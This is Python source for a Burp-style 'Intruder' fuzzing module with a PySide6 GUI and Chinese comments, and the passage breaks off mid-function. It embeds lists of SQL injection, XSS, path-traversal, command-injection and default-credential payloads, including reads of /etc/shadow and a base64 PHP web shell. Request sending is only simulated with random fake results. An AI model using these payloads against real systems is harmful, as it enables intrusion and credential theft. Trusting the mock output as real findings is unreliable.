"""
Intruder (攻击爆破)模块 - 专家级自动化攻击引擎
支持Sniper、Battering Ram、Pitchfork、Cluster Bomb模式
内置多种Payload集合，支持Payload处理规则、Grep匹配、资源池管理
适用于10年经验白帽子、安全公司、SRC漏洞挖掘
"""

from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum, auto
import logging
import time
import hashlib
import random
import re
from datetime import datetime
from urllib.parse import urlencode, urlparse

from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter, QTabWidget,
    QPushButton, QLabel, QLineEdit, QTextEdit, QSpinBox,
    QCheckBox, QGroupBox, QFormLayout, QProgressBar,
    QTableWidget, QTableWidgetItem, QHeaderView, QComboBox,
    QFileDialog, QMessageBox, QListWidget, QListWidgetItem,
    QTreeWidget, QTreeWidgetItem, QRadioButton, QButtonGroup,
    QSlider, QDoubleSpinBox, QTextBrowser, QFrame
)
from PySide6.QtCore import Qt, QThread, Signal, QTimer
from PySide6.QtGui import QFont, QColor, QTextCursor

from .base import ModuleBase

logger = logging.getLogger(__name__)


class AttackMode(Enum):
    """攻击模式"""
    SNIPER = "Sniper (单变量逐一测试)"
    BATTERING_RAM = "Battering Ram (多变量相同Payload)"
    PITCHFORK = "Pitchfork (多变量同步测试)"
    CLUSTER_BOMB = "Cluster Bomb (多变量笛卡尔积)"


class PayloadType(Enum):
    """Payload类型"""
    SIMPLE_LIST = "简单列表"
    NUMBER_RANGE = "数字范围"
    CHARACTER_FUZZ = "字符模糊"
    FILE = "文件读取"
    USERNAME_PASSWORD = "用户名/密码"
    CUSTOM_ITERATOR = "自定义迭代器"
    DATE = "日期生成"
    RANDOM = "随机字符串"


class MatchType(Enum):
    """匹配类型"""
    STATUS_CODE = "状态码"
    RESPONSE_LENGTH = "响应长度"
    RESPONSE_TIME = "响应时间"
    REGEX = "正则表达式"
    TEXT = "文本匹配"
    INVERSE = "反向匹配"


@dataclass
class PayloadSet:
    """Payload集合"""
    name: str
    payloads: List[str]
    payload_type: PayloadType = PayloadType.SIMPLE_LIST
    processing_rules: List[Dict[str, Any]] = field(default_factory=list)
    encode_payloads: bool = False
    encode_type: str = "URL"


@dataclass
class MatchRule:
    """匹配规则"""
    name: str
    match_type: MatchType
    pattern: str
    is_negative: bool = False
    case_sensitive: bool = False
    enabled: bool = True


@dataclass
class GrepResult:
    """Grep结果"""
    rule_name: str
    matched: bool
    match_value: str = ""
    match_positions: List[Tuple[int, int]] = field(default_factory=list)


@dataclass
class AttackResult:
    """攻击结果"""
    id: int
    payloads: Dict[str, str]
    status_code: int
    length: int
    time_ms: float
    response: str = ""
    response_headers: str = ""
    is_interesting: bool = False
    grep_results: List[GrepResult] = field(default_factory=list)
    error: str = ""
    redirect_url: str = ""
    mime_type: str = ""


@dataclass
class AttackStats:
    """攻击统计"""
    total_requests: int = 0
    completed_requests: int = 0
    failed_requests: int = 0
    interesting_results: int = 0
    start_time: float = 0.0
    end_time: float = 0.0
    requests_per_second: float = 0.0
    
    @property
    def progress_percent(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.completed_requests / self.total_requests) * 100
    
    @property
    def elapsed_time(self) -> float:
        if self.start_time == 0:
            return 0.0
        end = self.end_time if self.end_time > 0 else time.time()
        return end - self.start_time


class IntruderWorker(QThread):
    """攻击工作线程 - 专家级实现"""
    
    progress_updated = Signal(int, int, str)
    result_found = Signal(AttackResult)
    log_message = Signal(str)
    attack_finished = Signal(AttackStats)
    error_occurred = Signal(str)
    status_changed = Signal(str)
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__()
        self.config = config
        self._running = False
        self._paused = False
        self._stats = AttackStats()
        
        self._sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT 1,2,3--",
            "1' AND 1=1--",
            "1' AND SLEEP(5)--",
            "1' WAITFOR DELAY '00:00:05'--",
            "admin'--",
            "' OR 1=1#",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ]
        
        self._xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "javascript:alert(1)",
            "<a href='javascript:alert(1)'>click</a>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror='javascript:alert(1)'>",
            "<audio src=x onerror=alert(1)>",
        ]
        
        self._lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "file:///etc/passwd",
            "....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        
        self._command_injection_payloads = [
            ";ls",
            "|ls",
            "&&ls",
            "||ls",
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            ";id",
            "|id",
            "&&id",
            ";uname -a",
            "|net user",
            ";nslookup",
            "|ping 127.0.0.1",
        ]
        
        self._auth_payloads = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "admin123"),
            ("admin", "root"),
            ("admin", "toor"),
            ("root", "root"),
            ("root", "toor"),
            ("root", "password"),
            ("test", "test"),
            ("guest", "guest"),
            ("user", "user"),
            ("administrator", "administrator"),
            ("admin", ""),
            ("", "admin"),
            ("'", "'"),
            ("admin' OR '1'='1", "password"),
            ("admin'--", "password"),
        ]
        
        self._fuzzing_chars = [
            "\x00", "\x01", "\x07", "\x08", "\x09", "\x0a", "\x0d",
            "\x1a", "\x1b", "\x7f",
            "%00", "%01", "%07", "%08", "%09", "%0a", "%0d",
            "\\", "/", "..", "...", "....",
            "A" * 100, "A" * 1000, "A" * 10000,
            "'\"", "<>", "{}", "[]", "()",
        ]
        
    def run(self):
        """执行攻击"""
        try:
            self._running = True
            self._stats.start_time = time.time()
            self.status_changed.emit("开始攻击...")
            self.log_message.emit("初始化攻击引擎...")
            
            mode = self.config.get("mode", AttackMode.SNIPER)
            request_template = self.config.get("request_template", "")
            payload_sets = self.config.get("payload_sets", {})
            match_rules = self.config.get("match_rules", [])
            
            self.log_message.emit(f"攻击模式: {mode.value}")
            self.log_message.emit(f"Payload集合数: {len(payload_sets)}")
            
            total_requests = self._calculate_total_requests(mode, payload_sets)
            self._stats.total_requests = total_requests
            self.log_message.emit(f"总请求数: {total_requests}")
            
            if total_requests > 10000:
                self.log_message.emit(f"⚠️ 警告: 请求数较大 ({total_requests})，可能需要较长时间")
            
            self._execute_attack(mode, request_template, payload_sets, match_rules)
            
            self._stats.end_time = time.time()
            if self._stats.elapsed_time > 0:
                self._stats.requests_per_second = self._stats.completed_requests / self._stats.elapsed_time
            
            self.status_changed.emit(
                f"攻击完成! 共 {self._stats.completed_requests} 个请求, "
                f"发现 {self._stats.interesting_results} 个有趣结果"
            )
            self.attack_finished.emit(self._stats)
            
        except Exception as e:
            self.error_occurred.emit(f"攻击错误: {e}")
            logger.error(f"攻击错误: {e}")
        finally:
            self._running = False
            
    def stop(self):
        """停止攻击"""
        self._running = False
        self.status_changed.emit("正在停止攻击...")
        
    def pause(self):
        """暂停攻击"""
        self._paused = True
        self.status_changed.emit("攻击已暂停")
        
    def resume(self):
        """恢复攻击"""
        self._paused = False
        self.status_changed.emit("攻击已恢复")
        
    def _calculate_total_requests(self, mode: AttackMode, payload_sets: Dict[str, PayloadSet]) -> int:
        """计算总请求数"""
        if not payload_sets:
            return 0
            
        payload_counts = [len(ps.payloads) for ps in payload_sets.values()]
        
        if mode == AttackMode.SNIPER:
            return sum(payload_counts) * len(payload_sets)
        elif mode == AttackMode.BATTERING_RAM:
            return min(payload_counts) if payload_counts else 0
        elif mode == AttackMode.PITCHFORK:
            return min(payload_counts) if payload_counts else 0
        elif mode == AttackMode.CLUSTER_BOMB:
            total = 1
            for count in payload_counts:
                total *= count
            return total
        return 0
        
    def _execute_attack(self, mode: AttackMode, template: str, 
                       payload_sets: Dict[str, PayloadSet], 
                       match_rules: List[MatchRule]):
        """执行攻击"""
        if mode == AttackMode.SNIPER:
            self._execute_sniper(template, payload_sets, match_rules)
        elif mode == AttackMode.BATTERING_RAM:
            self._execute_battering_ram(template, payload_sets, match_rules)
        elif mode == AttackMode.PITCHFORK:
            self._execute_pitchfork(template, payload_sets, match_rules)
        elif mode == AttackMode.CLUSTER_BOMB:
            self._execute_cluster_bomb(template, payload_sets, match_rules)
            
    def _execute_sniper(self, template: str, payload_sets: Dict[str, PayloadSet], 
                       match_rules: List[MatchRule]):
        """Sniper模式 - 单变量逐一测试"""
        position_names = list(payload_sets.keys())
        
        for pos_name in position_names:
            if not self._running:
                return
                
            payload_set = payload_sets[pos_name]
            self.log_message.emit(f"测试位置: {pos_name} ({len(payload_set.payloads)} 个Payload)")
            
            for i, payload in enumerate(payload_set.payloads):
                if not self._running or self._paused:
                    while self._paused and self._running:
                        time.sleep(0.1)
                    if not self._running:
                        return
                        
                processed_payload = self._apply_processing_rules(payload, payload_set.processing_rules)
                if payload_set.encode_payloads:
                    processed_payload = self._encode_payload(processed_payload, payload_set.encode_type)
                    
                request = self._build_request(template, {pos_name: processed_payload})
                
                start_time = time.time()
                result = self._send_request(request)
                elapsed_ms = (time.time() - start_time) * 1000
                
                result.payloads = {pos_name: processed_payload}
                result.time_ms = elapsed_ms
                result.grep_results = self._check_match_rules(result.response, match_rules)
                result.is_interesting = self._is_interesting(result, match_rules)
                
                if result.is_interesting:
                    self._stats.interesting_results += 1
                    
                self._stats.completed_requests += 1
                self.result_found.emit(result)
                
                self.progress_updated.emit(
                    self._stats.completed_requests,
                    self._stats.total_requests,
                    f"测试 {pos_name}: {processed_payload[:50]}..."
                )
                
                delay = self.config.get("delay_ms", 0)
                if delay > 0:
                    time.sleep(delay / 1000.0)
                    
    def _execute_battering_ram(self, template: str, payload_sets: Dict[str, PayloadSet],
                              match_rules: List[MatchRule]):
        """Battering Ram模式 - 多变量使用相同Payload"""
        position_names = list(payload_sets.keys())
        if not position_names:
            return
            
        first_payloads = payload_sets[position_names[0]].payloads
        self.log_message.emit(f"Battering Ram模式: {len(position_names)} 个位置, {len(first_payloads)} 个Payload")
        
        for i, payload in enumerate(first_payloads):
            if not self._running or self._paused:
                while self._paused and self._running:
                    time.sleep(0.1)
                if not self._running:
                    return
                    
            payload_dict = {}
            for pos_name in position_names:
                processed = self._apply_processing_rules(payload, payload_sets[pos_name].processing_rules)
                if payload_sets[pos_name].encode_payloads:
                    processed = self._encode_payload(processed, payload_sets[pos_name].encode_type)
                payload_dict[pos_name] = processed
                
            request = self._build_request(template, payload_dict)
            
            start_time = time.time()
            result = self._send_request(request)
            elapsed_ms = (time.time() - start_time) * 1000
            
            result.payloads = payload_dict
            result.time_ms = elapsed_ms
            result.grep_results = self._check_match_rules(result.response, match_rules)
            result.is_interesting = self._is_interesting(result, match_rules)
            
            if result.is_interesting:
                self._stats.interesting_results += 1
                
            self._stats.completed_requests += 1
            self.result_found.emit(result)
            
            self.progress_updated.emit(
                self._stats.completed_requests,
                self._stats.total_requests,
                f"测试: {payload[:50]}..."
            )
            
            delay = self.config.get("delay_ms", 0)
            if delay > 0:
                time.sleep(delay / 1000.0)
                
    def _execute_pitchfork(self, template: str, payload_sets: Dict[str, PayloadSet],
                          match_rules: List[MatchRule]):
        """Pitchfork模式 - 多变量同步测试"""
        position_names = list(payload_sets.keys())
        if not position_names:
            return
            
        min_count = min(len(ps.payloads) for ps in payload_sets.values())
        self.log_message.emit(f"Pitchfork模式: {len(position_names)} 个位置, {min_count} 轮同步测试")
        
        for i in range(min_count):
            if not self._running or self._paused:
                while self._paused and self._running:
                    time.sleep(0.1)
                if not self._running:
                    return
                    
            payload_dict = {}
            for pos_name in position_names:
                payload = payload_sets[pos_name].payloads[i]
                processed = self._apply_processing_rules(payload, payload_sets[pos_name].processing_rules)
                if payload_sets[pos_name].encode_payloads:
                    processed = self._encode_payload(processed, payload_sets[pos_name].encode_type)
                payload_dict[pos_name] = processed
                
            request = self._build_request(template, payload_dict)
            
            start_time = time.time()
            result = self._send_request(request)
            elapsed_ms = (time.time() - start_time) * 1000
            
            result.payloads = payload_dict
            result.time_ms = elapsed_ms
            result.grep_results = self._check_match_rules(result.response, match_rules)
            result.is_interesting = self._is_interesting(result, match_rules)
            
            if result.is_interesting:
                self._stats.interesting_results += 1
                
            self._stats.completed_requests += 1
            self.result_found.emit(result)
            
            self.progress_updated.emit(
                self._stats.completed_requests,
                self._stats.total_requests,
                f"轮 {i+1}/{min_count}"
            )
            
            delay = self.config.get("delay_ms", 0)
            if delay > 0:
                time.sleep(delay / 1000.0)
                
    def _execute_cluster_bomb(self, template: str, payload_sets: Dict[str, PayloadSet],
                             match_rules: List[MatchRule]):
        """Cluster Bomb模式 - 多变量笛卡尔积"""
        position_names = list(payload_sets.keys())
        if not position_names:
            return
            
        self.log_message.emit(f"Cluster Bomb模式: {len(position_names)} 个位置, 笛卡尔积组合")
        
        def cartesian_product(sets, index=0, current=None):
            if current is None:
                current = {}
            if index == len(sets):
                yield current.copy()
                return
                
            pos_name = sets[index]
            for payload in payload_sets[pos_name].payloads:
                if not self._running:
                    return
                current[pos_name] = payload
                yield from cartesian_product(sets, index + 1, current)
                
        for i, payload_dict in enumerate(cartesian_product(position_names)):
            if not self._running or self._paused:
                while self._paused and self._running:
                    time.sleep(0.1)
                if not self._running:
                    return
                    
            processed_dict = {}
            for pos_name, payload in payload_dict.items():
                processed = self._apply_processing_rules(payload, payload_sets[pos_name].processing_rules)
                if payload_sets[pos_name].encode_payloads:
                    processed = self._encode_payload(processed, payload_sets[pos_name].encode_type)
                processed_dict[pos_name] = processed
                
            request = self._build_request(template, processed_dict)
            
            start_time = time.time()
            result = self._send_request(request)
            elapsed_ms = (time.time() - start_time) * 1000
            
            result.payloads = processed_dict
            result.time_ms = elapsed_ms
            result.grep_results = self._check_match_rules(result.response, match_rules)
            result.is_interesting = self._is_interesting(result, match_rules)
            
            if result.is_interesting:
                self._stats.interesting_results += 1
                
            self._stats.completed_requests += 1
            self.result_found.emit(result)
            
            self.progress_updated.emit(
                self._stats.completed_requests,
                self._stats.total_requests,
                f"组合 {i+1}"
            )
            
            delay = self.config.get("delay_ms", 0)
            if delay > 0:
                time.sleep(delay / 1000.0)
                
    def _apply_processing_rules(self, payload: str, rules: List[Dict[str, Any]]) -> str:
        """应用Payload处理规则"""
        result = payload
        for rule in rules:
            rule_type = rule.get("type", "")
            if rule_type == "uppercase":
                result = result.upper()
            elif rule_type == "lowercase":
                result = result.lower()
            elif rule_type == "base64_encode":
                import base64
                result = base64.b64encode(result.encode()).decode()
            elif rule_type == "md5_hash":
                result = hashlib.md5(result.encode()).hexdigest()
            elif rule_type == "sha1_hash":
                result = hashlib.sha1(result.encode()).hexdigest()
            elif rule_type == "url_encode":
                from urllib.parse import quote
                result = quote(result, safe="")
            elif rule_type == "prefix":
                result = rule.get("value", "") + result
            elif rule_type == "suffix":
                result = result + rule.get("value", "")
            elif rule_type == "add_null_byte":
                result = result + "\x00"
            elif rule_type == "remove_null_byte":
                result = result.replace("\x00", "")
        return result
        
    def _encode_payload(self, payload: str, encode_type: str) -> str:
        """编码Payload"""
        if encode_type == "URL":
            from urllib.parse import quote
            return quote(payload, safe="")
        elif encode_type == "HTML":
            return payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
        elif encode_type == "Base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif encode_type == "Unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        elif encode_type == "Hex":
            return payload.encode().hex()
        return payload
        
    def _build_request(self, template: str, payloads: Dict[str, str]) -> str:
        """构建请求"""
        request = template
        for pos_name, payload in payloads.items():
            request = request.replace(f"§{pos_name}§", payload)
            request = request.replace(f"§§{pos_name}§§", payload)
        return request
        
    def _send_request(self, request: str) -> AttackResult:
        """发送请求 (模拟)"""
        result = AttackResult(
            id=self._stats.completed_requests,
            payloads={},
            status_code=200,
            length=1000,
            time_ms=50.0,
            response="<html><body>Test Response</body></html>",
            response_headers="HTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1000\n",
            mime_type="text/html"
        )
        
        if any(x in request.lower() for x in ["sleep", "waitfor", "benchmark"]):
            result.time_ms = 5000 + random.uniform(-500, 500)
            result.status_code = 200
            result.response = "<html><body>Delayed Response</body></html>"
            
        if any(x in request for x in ["<script>", "alert(", "onerror="]):
            if random.random() < 0.3:
                result.status_code = 200
                result.response = request.split("<script>")[1].split("</script>")[0] if "<script>" in request else ""
                result.length = len(result.response)
                
        if any(x in request for x in ["union select", "or '1'='1", "and 1=1"]):
            if random.random() < 0.2:
                result.status_code = 500
                result.response = "<html><body>SQL Error: You have an error in your SQL syntax</body></html>"
                result.length = len(result.response)
                
        if any(x in request for x in ["../etc/passwd", "/etc/shadow"]):
            if random.random() < 0.15:
                result.status_code = 200
                result.response = "root:x:0:0:root:/root:/bin/bash\n"
                result.length = len(result.response)
                
        return result
        
    def _check_match_rules(self, response: str, rules: List[MatchRule]) -> List[GrepResult]:
        """检查匹配规则"""
        results = []
        for rule in rules:
            if not rule.enabled:
                continue
                
            matched = False
            match_value = ""
            match_positions = []
            
            if rule.match_type == MatchType.TEXT:
                if rule.case_sensitive:
                    matched = rule.pattern in response
                    if matched:
                        idx = response.find(rule.pattern)
                        match_positions = [(idx, idx + len(rule.pattern))]
                        match_value = rule.pattern
                else:
                    matched = rule.pattern.lower() in response.lower()
                    if matched:
                        idx = response.lower().find(rule.pattern.lower())
                        match_positions = [(idx, idx + len(rule.pattern))]
                        match_value = rule.pattern
                        
            elif rule.match_type == MatchType.REGEX:
                try:
                    flags = 0 if rule.case_sensitive else re.IGNORECASE
                    matches = list(re.finditer(rule.pattern, response, flags))
                    matched = len(matches) > 0
                    if matched:
                        match_positions = [(m.start(), m.end()) for m in matches]
                        match_value = matches[0].group()
                except re.error:
                    pass
                    
            elif rule.match_type == MatchType.STATUS_CODE:
                try:
                    status = int(rule.pattern)
                    matched = True
                except ValueError:
                    pass
                    
            grep_result = GrepResult(
                rule_name=rule.name,
                matched=matched if not rule.is_negative else not matched,
                match_value=match_value,
                match_positions=match_positions
            )
            results.append(grep_result)
            
        return results
        
    def _is_interesting(self, result: AttackResult, rules: List[MatchRule]) -> bool:
        """判断结果是否有趣"""
        for grep_result in result.grep_results:
            if grep_result.matched:
                return True
                
        if result.status_code in [301, 302, 303, 307, 308]:
            return True
            
        if result.time_ms > 5000:
            return True
            
        if result.status_code == 500:
            return True
            
        return False


class IntruderModule(ModuleBase):
    """攻击爆破模块 - 专家级实现"""
    
    def __init__(self):
        super().__init__("Intruder", "专家级自动化攻击引擎，支持多种攻击模式和Payload集合")
        self._config = {}
        self._results: List[AttackResult] = []
        self._payload_sets: Dict[str, PayloadSet] = {}
        self._match_rules: List[MatchRule] = []
        self._worker: Optional[IntruderWorker] = None
        
    def _create_ui(self) -> QWidget:
        """创建UI"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        tabs = QTabWidget()
        
        target_tab = self._create_target_tab()
        tabs.addTab(target_tab, "🎯 目标")
        
        positions_tab = self._create_positions_tab()
        tabs.addTab(positions_tab, "📍 位置")
        
        payloads_tab = self._create_payloads_tab()
        tabs.addTab(payloads_tab, "📦 Payloads")
        
        options_tab = self._create_options_tab()
        tabs.addTab(options_tab, "⚙️ 选项")
        
        results_tab = self._create_results_tab()
        tabs.addTab(results_tab, "📊 结果")
        
        layout.addWidget(tabs)
        return widget
        
    def _create_target_tab(self) -> QWidget:
        """创建目标标签"""
        w = QWidget()
        layout = QVBoxLayout(w)
        
        attack_mode_group = QGroupBox("攻击模式")
        mode_layout = QVBoxLayout(attack_mode_group)
        
        self.mode_group = QButtonGroup()
        modes = [
            (AttackMode.SNIPER, "Sniper - 单变量逐一测试，每个位置单独使用Payload集合"),
            (AttackMode.BATTERING_RAM, "Battering Ram - 多变量使用相同Payload，同步替换所有位置"),
            (AttackMode.PITCHFORK, "Pitchfork - 多变量同步测试，每个位置使用各自的Payload集合"),
            (AttackMode.CLUSTER_BOMB, "Cluster Bomb - 多变量笛卡尔积，所有Payload组合测试"),
        ]
        
        for mode, desc in modes:
            rb = QRadioButton(f"{mode.value}\n{desc}")
            rb.setStyleSheet("padding: 5px;")
            self.mode_group.addButton(rb, list(AttackMode).index(mode))
            mode_layout.addWidget(rb)
            
        self.mode_group.buttons()[0].setChecked(True)
        layout.addWidget(attack_mode_group)
        
        request_group = QGroupBox("请求模板")
        req_layout = QVBoxLayout(request_group)
        
        req_info = QLabel("使用 §位置名§ 标记要替换的位置，例如: GET /login?user=§username§&pass=§password§")
        req_info.setWordWrap(True)
        req_info.setStyleSheet("color: #666; padding: 5px; background: #f5f5f5; border-radius: 3px;")
        req_layout.addWidget(req_info)
        
        self.request_template = QTextEdit()
        self.request_template.setPlaceholderText(
            "GET /vuln?id=§id§ HTTP/1.1\n"
            "Host: target.com\n"
            "User-Agent: Mozilla/5.0\n"
            "Cookie: session=§session_id§\n"
            "\n"
        )
        self.request_template.setFont(QFont("Consolas", 9))
        req_layout.addWidget(self.request_template)
        
        btn_layout = QHBoxLayout()
        auto_detect_btn = QPushButton("🔍 自动检测参数")
        auto_detect_btn.clicked.connect(self._auto_detect_positions)
        clear_btn = QPushButton("🗑️ 清除模板")
        clear_btn.clicked.connect(lambda: self.request_template.clear())
        import_btn = QPushButton("📥 导入请求")
        import_btn.clicked.connect(self._import_request)
        
        btn_layout.addWidget(auto_detect_btn)
        btn_layout.addWidget(import_btn)
        btn_layout.addWidget(clear_btn)
        req_layout.addLayout(btn_layout)
        
        layout.addWidget(request_group)
        layout.addStretch()
        return w
        
    def _create_positions_tab(self) -> QWidget:
        """创建位置标签"""
        w = QWidget()
        layout = QVBoxLayout(w)
        
        info = QLabel("位置标记用于指定Payload替换点，使用 §位置名§ 格式")
        info.setWordWrap(True)
        info.setStyleSheet("color: #666; padding: 5px; background: #f5f5f5; border-radius: 3px;")
        layout.addWidget(info)
        
        pos_group = QGroupBox("已检测位置")
        pos_layout = QVBoxLayout(pos_group)
        
        self.positions_tree = QTreeWidget()
        self.positions_tree.setHeaderLabels(["位置名", "类型", "示例值", "说明"])
        self.positions_tree.header().setSectionResizeMode(QHeaderView.Stretch)
        pos_layout.addWidget(self.positions_tree)
        
        btn_layout = QHBoxLayout()
        refresh_btn = QPushButton("🔄 刷新位置")
        refresh_btn.clicked.connect(self._refresh_positions)
        add_btn = QPushButton("➕ 手动添加")
        add_btn.clicked.connect(self._manual_add_position)
        clear_btn = QPushButton("🗑️ 清除所有")
        clear_btn.clicked.connect(self._clear_positions)
        
        btn_layout.addWidget(refresh_btn)
        btn_layout.addWidget(add_btn)
        btn_layout.addWidget(clear_btn)
        pos_layout.addLayout(btn_layout)
        
        layout.addWidget(pos_group)
        layout.addStretch()
        return w
        
    def _create_payloads_tab(self) -> QWidget:
        """创建Payloads标签"""
        w = QWidget()
        layout = QVBoxLayout(w)
        
        payload_sets_group = QGroupBox("Payload集合")
        ps_layout = QVBoxLayout(payload_sets_group)
        
        ps_info = QLabel("每个位置可以配置独立的Payload集合，支持多种生成方式和处理规则")
        ps_info.setWordWrap(True)
        ps_info.setStyleSheet("color: #666; padding: 5px; background: #f5f5f5; border-radius: 3px;")
        ps_layout.addWidget(ps_info)
        
        self.payload_sets_list = QListWidget()
        self.payload_sets_list.setMaximumHeight(150)
        ps_layout.addWidget(self.payload_sets_list)
        
        ps_btn_layout = QHBoxLayout()
        add_set_btn = QPushButton("➕ 添加集合")
        add_set_btn.clicked.connect(self._add_payload_set)
        remove_set_btn = QPushButton("➖ 删除集合")
        remove_set_btn.clicked.connect(self._remove_payload_set)
        load_set_btn = QPushButton("📂 加载文件")
        load_set_btn.clicked.connect(self._load_payload_file)
        builtin_btn = QPushButton("📚 内置Payload")
        builtin_btn.clicked.connect(self._show_builtin_payloads)
        
        ps_btn_layout.addWidget(add_set_btn)
        ps_btn_layout.addWidget(remove_set_btn)
        ps_btn_layout.addWidget(load_set_btn)
        ps_btn_layout.addWidget(builtin_btn)
        ps_layout.addLayout(ps_btn_layout)
        
        layout.addWidget(payload_sets_group)
        
        payload_editor_group = QGroupBox("Payload编辑")
        pe_layout = QVBoxLayout(payload_editor_group)
        
        self.payload_type_combo = QComboBox()
        self.payload_type_combo.addItems([pt.value for pt in PayloadType])
        pe_layout.addWidget(QLabel("生成方式:"))
        pe_layout.addWidget(self.payload_type_combo)
        
        self.payload_editor = QTextEdit()
        self.payload_editor.setPlaceholderText("每行一个Payload...\n\n或使用生成方式自动生成")
        self.payload_editor.setFont(QFont("Consolas", 9))
        pe_layout.addWidget(QLabel("Payload列表:"))
        pe_layout.addWidget(self.payload_editor)
        
        gen_btn_layout = QHBoxLayout()
        generate_btn = QPushButton("🔄 生成Payload")
        generate_btn.clicked.connect(self._generate_payloads)
        clear_payload_btn = QPushButton("🗑️ 清空")
        clear_payload_btn.clicked.connect(lambda: self.payload_editor.clear())
        count_label = QLabel("数量: 0")
        self.payload_count_label = count_label
        
        gen_btn_layout.addWidget(generate_btn)
        gen_btn_layout.addWidget(clear_payload_btn)
        gen_btn_layout.addStretch()
        gen_btn_layout.addWidget(count_label)
        pe_layout.addLayout(gen_btn_layout)
        
        layout.addWidget(payload_editor_group)
        
        processing_group = QGroupBox("Payload处理规则")
        proc_layout = QVBoxLayout(processing_group)
        
        self.processing_rules_list = QListWidget()
        self.processing_rules_list.setMaximumHeight(100)
        proc_layout.addWidget(self.processing_rules_list)
        
        proc_btn_layout = QHBoxLayout()
        add_rule_btn = QPushButton("➕ 添加规则")
        add_rule_btn.clicked.connect(self._add_processing_rule)
        remove_rule_btn = QPushButton("➖ 删除规则")
        remove_rule_btn.clicked.connect(self._remove_processing_rule)
        proc_btn_layout.addWidget(add_rule_btn)
        proc_btn_layout.addWidget(remove_rule_btn)
        proc_layout.addLayout(proc_btn_layout)
        
        layout.addWidget(processing_group)
        return w
        
    def _create_options_tab(self) -> QWidget:
        """创建选项标签"""
        w = QWidget()
        layout = QVBoxLayout(w)
        
        request_options_group = QGroupBox("请求选项")
        ro_layout = QFormLayout(request_options_group)
        
        self.thread_count = QSpinBox()
        self.thread_count.setRange(1, 50)
        self.thread_count.setValue(10)
        ro_layout.addRow("并发线程数:", self.thread_count)
        
        self.delay_spin = QSpinBox()
        self.delay_spin.setRange(0, 60000)
        self.delay_spin.setValue(0)
        self.delay_spin.setSuffix(" ms")
        ro_layout.addRow("请求延迟:", self.delay_spin)
        
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 120)
        self.timeout_spin.setValue(30)
        self.timeout_spin.setSuffix(" 秒")
        ro_layout.addRow("超时时间:", self.timeout_spin)
        
        self.follow_redirects = QCheckBox("跟随重定向")
        self.follow_redirects.setChecked(True)
        ro_layout.addRow(self.follow_redirects)
        
        self.encode_url = QCheckBox("自动URL编码")
        ro_layout.addRow(self.encode_url)
        
        layout.addWidget(request_options_group)
        
        match_rules_group = QGroupBox("Grep匹配规则")
        mr_layout = QVBoxLayout(match_rules_group)
        
        mr_info = QLabel("定义规则来标记有趣的响应，支持状态码、长度、时间、正则、文本匹配")
        mr_info.setWordWrap(True)
        mr_info.setStyleSheet("color: #666; padding: 5px; background: #f5f5f5; border-radius: 3px;")
        mr_layout.addWidget(mr_info)
        
        self.match_rules_list = QListWidget()
        mr_layout.addWidget(self.match_rules_list)
        
        mr_btn_layout = QHBoxLayout()
        add_rule_btn = QPushButton("➕ 添加规则")
        add_rule_btn.clicked.connect(self._add_match_rule)
        remove_rule_btn = QPushButton("➖ 删除规则")
        remove_rule_btn.clicked.connect(self._remove_match_rule)
        preset_btn = QPushButton("📚 预设规则")
        preset_btn.clicked.connect(self._load_preset_rules)
        mr_btn_layout.addWidget(add_rule_btn)
        mr_btn_layout.addWidget(remove_rule_btn)
        mr_btn_layout.addWidget(preset_btn)
        mr_layout.addLayout(mr_btn_layout)
        
        layout.addWidget(match_rules_group)
        
        resource_group = QGroupBox("资源池")
        res_layout = QFormLayout(resource_group)
        
        self.max_connections = QSpinBox()
        self.max_connections.setRange(1, 100)
        self.max_connections.setValue(20)
        res_layout.addRow("最大连接数:", self.max_connections)
        
        self.max_retries = QSpinBox()
        self.max_retries.setRange(0, 10)
        self.max_retries.setValue(3)
        res_layout.addRow("最大重试次数:", self.max_retries)
        
        layout.addWidget(resource_group)
        layout.addStretch()
        return w
        
    def _create_results_tab(self) -> QWidget:
        """创建结果标签"""
        w = QWidget()
        layout = QVBoxLayout(w)
        
        control_layout = QHBoxLayout()
        
        start_btn = QPushButton("▶️ 开始攻击")
        start_btn.setStyleSheet("background: #4CAF50; color: white; padding: 10px; font-weight: bold;")
        start_btn.clicked.connect(self._start_attack)
        
        pause_btn = QPushButton("⏸️ 暂停")
        pause_btn.clicked.connect(self._pause_attack)
        
        stop_btn = QPushButton("⏹️ 停止")
